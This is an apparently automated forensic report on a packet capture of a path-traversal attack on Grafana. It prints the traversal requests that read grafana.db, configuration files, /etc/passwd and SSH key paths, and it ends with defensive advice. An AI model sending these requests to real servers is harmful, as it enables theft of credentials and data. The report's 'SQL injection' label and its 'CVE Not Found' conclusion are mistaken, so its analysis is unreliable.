@@ -1,0 +1,359 @@
+=== MAFRA FORENSIC REPORT ===
+
+PCAP File: incident.pcap
+
+=== FLOW SUMMARY ===
+=== PCAP Analysis Report ===
+File: incident.pcap
+Processing Status: Valid
+Total TCP Streams: 14
+TCP Stream IDs: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13
+Protocol Counts: ICMPv6=2, ARP=12, DNS=8, TCP=206, TLSv1=2, TLSv1.3=22, HTTP=18, HTTP/JSON=6
+
+Connections Overview:
+================================================================================
+TCP Conversations
+Filter:<No Filter>
+                                                           |       <-      | |       ->      | |     Total     |    Relative    |   Duration   |
+                                                           | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |      Start     |              |
+172.18.0.1:44134           <-> 172.18.0.2:3000                 30 661 kB         32 2386 bytes      62 664 kB      125.979343000         0.2261
+172.18.0.2:46906           <-> 34.120.177.193:443              18 5411 bytes      19 1727 bytes      37 7138 bytes     5.346862000        90.3623
+172.18.0.2:51492           <-> 185.199.111.133:443             16 5809 bytes      17 1571 bytes      33 7380 bytes     5.712848000        90.0289
+172.18.0.1:44136           <-> 172.18.0.2:3000                 10 43 kB          12 1048 bytes      22 44 kB       127.158900000         0.0292
+172.18.0.1:4
+
+=== Flow Analysis ===
+
+--- Stream 0 [VALID] ---
+Service: None
+Relevant Events:
+- [E-S0000-F000009-001] TCP connection established from client to server
+- [E-S0000-F000010-002] TCP connection established from server to client
+- [E-S0000-F000012-003] TLSv1 connection initiated from client to server
+Exploit Indicators:
+- [E-S0000-F000014-004] TLSv1.3 connection established, indicating potential secure communication
+Malicious Activities: None
+Attack Success: Unknown
+Evidence Keywords: None
+
+--- Stream 1 [VALID] ---
+Service: None
+Relevant Events:
+- [E-S0001-F000040-001] TCP connection established from client to server
+- [E-S0001-F000041-002] TCP connection established from server to client
+- [E-S0001-F000045-004] TLSv1.3 response from server to client
+Exploit Indicators:
+- [E-S0001-F000043-003] None
+Malicious Activities: None
+Attack Success: Unknown
+Evidence Keywords: None
+
+--- Stream 2 [VALID] ---
+Service: Grafana
+Relevant Events:
+- [E-S0002-F000096-004] GET /public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db
+- [E-S0002-F000104-018] admin keyword observed
+- [E-S0002-F000098-009] CREATE TABLE `dashboard` (
+Exploit Indicators:
+- [E-S0002-F000096-007] ../
+Malicious Activities: SQL injection attempt and unauthorized access to database file
+Attack Success: Succeeded
+Evidence Keywords: SQL injection, path traversal, CREATE TABLE, admin, evidence IDs [E-S0002-F000096-004, E-S0002-F000104-018, E-S0002-F000098-009, E-S0002-F000096-007]
+
+--- Stream 3 [VALID] ---
+Service: Grafana 7.5.0 (based on the configuration file structure)
+Relevant Events:
+- [E-S0003-F000158-004] GET /public/plugins/alertlist/../../../../../conf/defaults.ini
+- [E-S0003-F000160-009] root user keyword observed
+- [E-S0003-F000162-015] admin keyword observed
+Exploit Indicators:
+- [E-S0003-F000158-007] ../
+Malicious Activities: Path traversal attempt to access configuration file
+Attack Success: Succeeded
+Evidence Keywords: path traversal, root, admin, defaults.ini, E-S0003-F000158-004, E-S0003-F000160-009, E-S0003-F000162-015
+
+--- Stream 4 [VALID] ---
+Service: Unknown application on port 3000
+Relevant Events:
+- [E-S0004-F000180-004] GET /public/plugins/alertlist/../../../../../../../..//etc/passwd
+- [E-S0004-F000182-010] root user keyword observed
+- [E-S0004-F000182-009] HTTP Status 200
+Exploit Indicators:
+- [E-S0004-F000180-007] ../
+Malicious Activities: Path traversal attempt to access /etc/passwd
+Attack Success: Succeeded
+Evidence Keywords: path traversal, /etc/passwd, root user, [E-S0004-F000180-004], [E-S0004-F000182-010]
+
+--- Stream 5 [VALID] ---
+Service: Unknown (HTTP service on port 3000)
+Relevant Events:
+- [E-S0005-F000190-004] GET /public/plugins/alertlist/../../../../../../../..//etc/shadow
+- [E-S0005-F000192-009] HTTP Status 500
+Exploit Indicators:
+- [E-S0005-F000190-007] ../
+Malicious Activities: Path traversal attempt
+Attack Success: Failed
+Evidence Keywords: path traversal, HTTP, 500 Internal Server Error, [E-S0005-F000190-004], [E-S0005-F000192-009]
+
+--- Stream 6 [VALID] ---
+Service: Unknown application on port 3000
+Relevant Events:
+- [E-S0006-F000200-004] GET /public/plugins/alertlist/../../../../../../../..//etc/hosts
+- [E-S0006-F000202-009] HTTP Status 200
+Exploit Indicators:
+- [E-S0006-F000200-007] ../
+Malicious Activities: Path traversal attempt
+Attack Success: Succeeded
+Evidence Keywords: path traversal, HTTP, 200 OK, [E-S0006-F000200-004], [E-S0006-F000200-007]
+
+--- Stream 7 [VALID] ---
+Service: Unknown application on port 3000
+Relevant Events:
+- [E-S0007-F000210-004] GET /public/plugins/alertlist/../../../../../../../..//etc/hostname
+- [E-S0007-F000212-009] HTTP Status 200
+Exploit Indicators:
+- [E-S0007-F000210-007] ../
+Malicious Activities: Path traversal attempt
+Attack Success: Succeeded
+Evidence Keywords: path traversal, HTTP, GET, evidence IDs: [E-S0007-F000210-004, E-S0007-F000210-007, E-S0007-F000212-009]
+
+--- Stream 8 [VALID] ---
+Service: Unknown application on port 3000
+Relevant Events:
+- [E-S0008-F000220-004] GET /public/plugins/alertlist/../../../../../../../..//etc/group
+- [E-S0008-F000222-010] root user keyword observed
+- [E-S0008-F000222-009] HTTP Status 200
+Exploit Indicators:
+- [E-S0008-F000220-007] ../
+Malicious Activities: Path traversal attempt to access /etc/group
+Attack Success: Succeeded
+Evidence Keywords: path traversal, root user, HTTP Status 200, [E-S0008-F000220-004], [E-S0008-F000222-010], [E-S0008-F000222-009]
+
+--- Stream 9 [VALID] ---
+Service: Unknown (HTTP service on port 3000)
+Relevant Events:
+- [E-S0009-F000230-004] GET /public/plugins/alertlist/../../../../../../../..//root/.bash_history
+- [E-S0009-F000232-010] HTTP Status 500
+- [E-S0009-F000230-007] root user keyword observed
+Exploit Indicators:
+- [E-S0009-F000230-008] ../
+Malicious Activities: Path traversal attempt to access /root/.bash_history
+Attack Success: Failed
+Evidence Keywords: path traversal, HTTP Status 500, root user keyword observed, [E-S0009-F000230-004], [E-S0009-F000230-007]
+
+--- Stream 10 [VALID] ---
+Service: HTTP/1.1 (likely a web application running on port 3000)
+Relevant Events:
+- [E-S0010-F000240-004] GET /public/plugins/alertlist/../../../../../../../..//root/.ssh/authorized_keys
+- [E-S0010-F000240-007] root user keyword observed
+- [E-S0010-F000242-010] HTTP Status 500
+Exploit Indicators:
+- [E-S0010-F000240-008] ../
+Malicious Activities: Path traversal attempt to access the authorized_keys file
+Attack Success: Failed
+Evidence Keywords: path traversal, HTTP Status 500, root user keyword, [E-S0010-F000240-004], [E-S0010-F000240-007], [E-S0010-F000242-010]
+
+--- Stream 11 [VALID] ---
+Service: HTTP/1.1 on port 3000
+Relevant Events:
+- [E-S0011-F000250-004] GET /public/plugins/alertlist/../../../../../../../..//var/log/syslog
+- [E-S0011-F000252-009] HTTP Status 404
+Exploit Indicators:
+- [E-S0011-F000250-007] ../
+Malicious Activities: Path traversal attempt
+Attack Success: Failed
+Evidence Keywords: path traversal, HTTP, 404, E-S0011-F000250-004, E-S0011-F000250-007
+
+--- Stream 12 [VALID] ---
+Service: Unknown (HTTP service on port 3000)
+Relevant Events:
+- [E-S0012-F000260-004] GET /public/plugins/alertlist/../../../../../../../..//var/log/auth.log
+- [E-S0012-F000262-009] HTTP Status 404
+Exploit Indicators:
+- [E-S0012-F000260-007] ../
+Malicious Activities: Path traversal attempt
+Attack Success: Failed
+Evidence Keywords: path traversal, HTTP, 404, [E-S0012-F000260-004], [E-S0012-F000262-009]
+
+--- Stream 13 [VALID] ---
+Service: HTTP/1.1 (version not explicitly visible, but service is on port 3000)
+Relevant Events:
+- [E-S0013-F000270-004] GET /public/plugins/alertlist/../../../../../../../..//var/www/html/config.php
+- [E-S0013-F000272-009] HTTP Status 404
+Exploit Indicators:
+- [E-S0013-F000270-007] ../
+Malicious Activities: Path traversal attempt
+Attack Success: Failed
+Evidence Keywords: path traversal, HTTP, 404, [E-S0013-F000270-004], [E-S0013-F000272-009]
+
+=== ANALYST OUTPUT ===
+{
+  "status": "Valid",
+  "service": {
+    "primary": "Grafana",
+    "application": "Grafana",
+    "framework": "Unknown",
+    "web_server": "Unknown",
+    "language": "Unknown",
+    "database": "SQLite"
+  },
+  "attack": {
+    "type": "Path Traversal",
+    "technique": "Arbitrary file read via /public/plugins/alertlist/../../ path traversal",
+    "success": "Success",
+    "evidence": [
+      "E-S0002-F000096-004",
+      "E-S0002-F000096-007",
+      "E-S0002-F000098-009",
+      "E-S0002-F000104-018",
+      "E-S0003-F000158-004",
+      "E-S0003-F000158-007",
+      "E-S0003-F000160-009",
+      "E-S0003-F000162-015",
+      "E-S0004-F000180-004",
+      "E-S0004-F000180-007",
+      "E-S0004-F000182-009",
+      "E-S0004-F000182-010",
+      "E-S0006-F000200-004",
+      "E-S0006-F000200-007",
+      "E-S0006-F000202-009",
+      "E-S0007-F000210-004",
+      "E-S0007-F000210-007",
+      "E-S0007-F000212-009",
+      "E-S0008-F000220-004",
+      "E-S0008-F000220-007",
+      "E-S0008-F000222-009",
+      "E-S0008-F000222-010"
+    ]
+  },
+  "cve": {
+    "candidate": "Not Found",
+    "confidence": "Unknown",
+    "reason": "Evidence indicates Grafana plugin path traversal enabling arbitrary file reads and access to grafana.db, but no specific CVE is supported by the provided evidence."
+  },
+  "confidence": "High"
+}
+
+=== VERIFIER OUTPUT ===
+{
+  "status": "Valid",
+  "verification_result": "Supported",
+  "service_supported": "Yes",
+  "attack_supported": "Yes",
+  "success_supported": "Yes",
+  "cve_supported": "Not Applicable",
+  "unsupported_claims": [],
+  "evidence_check": [
+    "E-S0002-F000096-004",
+    "E-S0002-F000096-007",
+    "E-S0002-F000098-009",
+    "E-S0002-F000104-018",
+    "E-S0003-F000158-004",
+    "E-S0003-F000158-007",
+    "E-S0003-F000160-009",
+    "E-S0003-F000162-015",
+    "E-S0004-F000180-004",
+    "E-S0004-F000180-007",
+    "E-S0004-F000182-009",
+    "E-S0004-F000182-010",
+    "E-S0006-F000200-004",
+    "E-S0006-F000200-007",
+    "E-S0006-F000202-009",
+    "E-S0007-F000210-004",
+    "E-S0007-F000210-007",
+    "E-S0007-F000212-009",
+    "E-S0008-F000220-004",
+    "E-S0008-F000220-007",
+    "E-S0008-F000222-009",
+    "E-S0008-F000222-010"
+  ],
+  "confidence": "High"
+}
+
+=== CONSENSUS SUMMARY ===
+Service: Grafana
+Attack Type: Path Traversal
+Attack Success: Success
+CVE: Not Found
+Verification Result: Supported
+Service Supported: Yes
+Attack Supported: Yes
+Success Supported: Yes
+CVE Supported: Not Applicable
+Verifier Confidence: High
+Overall Confidence: High
+Score: 4/4
+
+=== CVE VALIDATION ===
+{
+  "status": "Valid",
+  "validated_cve": "Not Found",
+  "cve_supported": "No",
+  "confidence": "High",
+  "reasons": [
+    "Observed Grafana 7.5.0 with successful path traversal via /public/plugins/alertlist/../../ reading grafana.db and defaults.ini.",
+    "CVE-2021-43813 only allows .md reads via /api/plugins/.*/markdown/ for authenticated users; evidence shows arbitrary file reads via /public/plugins and non-.md targets.",
+    "CVE-2021-43815 is limited to .csv files and requires the TestData DB data source; no such conditions or .csv access observed.",
+    "CVE-2021-36157 affects Grafana Cortex, not Grafana core; product mismatch with observed Grafana 7.5.0.",
+    "CVE-2022-2531 is a GitLab EE issue involving Grafana API under specific GitLab conditions; not applicable to standalone Grafana service.",
+    "CVE-2025-4123 and CVE-2025-6023 involve open redirect/XSS in Grafana 11.x; attack type and observed version 7.5.0 do not match.",
+    "Both Analyst and Verifier confirm the attack but do not support any specific CVE, aligning with Not Found."
+  ]
+}
+
+=== FINAL REPORT ===
+Affected Service: Grafana
+Identified CVE: Not Found
+Attack: Successful
+Is Service Vulnerable: Yes
+Evidence:
+- PCAP [E-S0002-F000096-004]: GET /public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db.
+- PCAP [E-S0002-F000096-007]: ../.
+- PCAP [E-S0002-F000098-009]: CREATE TABLE `dashboard` (.
+- PCAP [E-S0002-F000104-018]: admin keyword observed.
+- PCAP [E-S0003-F000158-004]: GET /public/plugins/alertlist/../../../../../conf/defaults.ini.
+- PCAP [E-S0003-F000158-007]: ../.
+- PCAP [E-S0003-F000160-009]: root user keyword observed.
+- PCAP [E-S0003-F000162-015]: admin keyword observed.
+- PCAP [E-S0004-F000180-004]: GET /public/plugins/alertlist/../../../../../../../..//etc/passwd.
+- PCAP [E-S0004-F000180-007]: ../.
+- PCAP [E-S0004-F000182-009]: HTTP Status 200.
+- PCAP [E-S0004-F000182-010]: root user keyword observed.
+- PCAP [E-S0006-F000200-004]: GET /public/plugins/alertlist/../../../../../../../..//etc/hosts.
+- PCAP [E-S0006-F000200-007]: ../.
+- PCAP [E-S0006-F000202-009]: HTTP Status 200.
+- PCAP [E-S0007-F000210-004]: GET /public/plugins/alertlist/../../../../../../../..//etc/hostname.
+- PCAP [E-S0007-F000210-007]: ../.
+- PCAP [E-S0007-F000212-009]: HTTP Status 200.
+- PCAP [E-S0008-F000220-004]: GET /public/plugins/alertlist/../../../../../../../..//etc/group.
+- PCAP [E-S0008-F000220-007]: ../.
+- PCAP [E-S0008-F000222-009]: HTTP Status 200.
+- PCAP [E-S0008-F000222-010]: root user keyword observed.
+
+Verification Summary:
+- Affected service: Grafana.
+- Attack type: Path Traversal.
+- Attack technique: Arbitrary file read via /public/plugins/alertlist/../../ path traversal.
+- Service supported by Verifier: Yes.
+- Attack supported by Verifier: Yes.
+- Attack success supported by Verifier: Yes.
+- Verification result: Supported.
+- Verifier confidence: High.
+- Consensus confidence: High.
+- Consensus score: 4/4.
+- Exact CVE attribution was not confirmed from the available packet and version evidence.
+- CVE assessment: Observed Grafana 7.5.0 with successful path traversal via /public/plugins/alertlist/../../ reading grafana.db and defaults.ini.
+- CVE assessment: CVE-2021-43813 only allows .md reads via /api/plugins/.*/markdown/ for authenticated users; evidence shows arbitrary file reads via /public/plugins and non-.md targets.
+- CVE assessment: CVE-2021-43815 is limited to .csv files and requires the TestData DB data source; no such conditions or .csv access observed.
+- CVE assessment: CVE-2021-36157 affects Grafana Cortex, not Grafana core; product mismatch with observed Grafana 7.5.0.
+- CVE assessment: CVE-2022-2531 is a GitLab EE issue involving Grafana API under specific GitLab conditions; not applicable to standalone Grafana service.
+- CVE assessment: CVE-2025-4123 and CVE-2025-6023 involve open redirect/XSS in Grafana 11.x; attack type and observed version 7.5.0 do not match.
+- CVE assessment: Both Analyst and Verifier confirm the attack but do not support any specific CVE, aligning with Not Found.
+
+Defensive Recommendation:
+- Upgrade Grafana to the latest stable version to patch known vulnerabilities.
+- Implement strict input validation and sanitization for all user-supplied data, especially in file path parameters.
+- Configure Grafana to run with the principle of least privilege, limiting its access to system resources and sensitive files.
+- Monitor Grafana access logs for unusual file access patterns or requests containing path traversal sequences (e.g., '..', '../').
+- Deploy a Web Application Firewall (WAF) to detect and block path traversal attempts.
+- Regularly review and audit Grafana plugin configurations and ensure only necessary and trusted plugins are enabled.
